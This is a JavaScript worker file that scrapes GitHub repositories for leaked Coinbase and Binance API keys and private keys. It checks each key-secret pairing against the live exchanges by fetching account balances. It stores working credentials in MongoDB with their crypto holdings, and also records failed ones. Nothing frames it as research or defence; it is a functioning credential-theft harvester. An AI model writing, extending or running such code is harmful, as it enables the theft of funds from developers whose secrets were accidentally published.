const { expose } = require("threads")


const handleRepo = async(repo, ghAccount) => {
  
    const data = await parser.collectData(repo.html_url)
    const shouldIgnore = ['gitignore', 'scss', 'DS_STORE', 'log', 'firebaserc', 'Miscellaneous', 'state', 'gitkeep', 'prettierrc', 'babelrc', 'pub', 'priv', 'gif', 'dockerignore', 'example', 'yml', 'prettierignore', 'jpg', 'eslintrc', 'lock', 'cjs', 'woff', 'sss', 'woff2', 'ttf', 'ico', 'map', 'gitattributes', 'eot', 'css', 'mp4', 'svg', 'ui', 'png', 'md']
    let files = []
    let filesChecked = 0
    //console.log('data', data)
    Object.keys(data).map(k => {
      if(k === 'env') {
        console.log('env found', data[k])
      }
      if(shouldIgnore.indexOf(k) === -1) {
        
        data[k].forEach(url => {
          files.push(url)
        })
      }
     
        
      })
    files = files.filter(item => item.indexOf('node_modules') === -1).filter(item => item.indexOf('robots.txt') === -1)
    let promises = []
    
    promises.push(Promise.map(files, (file, index) => {
      return ghAccount.request(`GET ${file}`).then(async res => {
        if(typeof res.data === 'object') {
         return Promise.resolve([])
        }
        let text = convert(res.data, {
          wordwrap: 130
        })
        // let base64Text = Buffer.from(res.data).toString('base64') //neccessary for parsing private keys
        // let privateKeys = await parseForPrivateKeys(base64Text)
        
        // let query = await testKeys(privateKeys)
        // console.log('got query', query)
        
        //returns an array of objects that look like {apiKey: '', secret: ''}
        // console.log(`parsing for binance keys in ${file} for ${repo.name}`)
  
        promises.push(parseForCoinbaseKeys(text).then(keys => {
          let testedTokens = []
          
          const {secrets, tokens} = keys;
          testedTokens.push(Promise.map(tokens, async token => {
           return Promise.each(secrets, async secret => {
              let combo = {apiKey: token, secret}
              console.log(combo)
              console.log('-----trying----', combo)
              try {
                const coinbase = new ccxt.coinbase({
                  apiKey: combo.apiKey,
                  secret: combo.secret
                })
                const balance = await coinbase.fetchBalance()
                console.log('coinbase balance', balance)
               return mongoose.model('coinbaseAccounts').create({
                  apiKey: combo.token,
                  secret: combo.secret
                }).then(res => res.save()).then(combo => {
                  console.log('new account for coinbase created in mongo', combo)
                })
  
              }
              catch(err) {
                Sentry.captureException(err)
              }
              })
            
  
          }))
          return Promise.all(testedTokens)
  
        }))
        promises.push(
          parseForPrivateKeys(text).then(keys => {
            // console.log('got private keys', keys)
            return testKeys(keys)
          })
        )
        promises.push(
          parseForBinanceKeys(text).then(keys => {
            // console.log('found binance keys', keys)
              const {secrets, tokens} = keys
              let testedCombos = []
          
            testedCombos.push(Promise.map(tokens, async token => {
              return Promise.each(secrets, async secret => {
                let combo = {apiKey: token, secret}
                console.log('------trying------', combo)
                try {
                  const binance = new ccxt.binance(combo)
                  const balance = await binance.fetchBalance()
                  console.log('account works', combo)
                  const {free} = balance
                  let cryptos = Object.keys(free).map(k => {
                      let balanceForCrypto = free[k]
                      if(balanceForCrypto > 0) {
                          return {crypto: k, balance: free[k]}
                      }
                      else {
                          return null
                      }
                  }).filter(item => item !== null)
                  console.log('cryptos', cryptos)
                 return mongoose.model('binanceAccounts').create({
                    token: combo.apiKey,
                    secret: combo.secret,
                    cryptos
    
                  }).then(doc => {
                    return doc.save()
                  })
                  
                }
                catch(err) {
                  console.log(`wrong credentials token ${combo.apiKey} secret: ${combo.secret}`)
                  console.log('repo was', repo.name)
                 return mongoose.model('binanceAccounts').create({
                    token: combo.apiKey,
                    secret: combo.secret,
                    cryptos: []
    
                  }).then(doc => doc.save())
                  
                }
                  })
               }))
               return Promise.all(testedCombos).catch(err => Sentry.captureException(err))
            }))
            return Promise.all(promises).catch(err => Sentry.captureException(err)).delay(5000)
      })
        
    }))
    return Promise.all(promises).catch(err => Sentry.captureException(err))
  }


  expose(async (repo, ghAccount) => {
    handleRepo(repo, ghAccount)
  })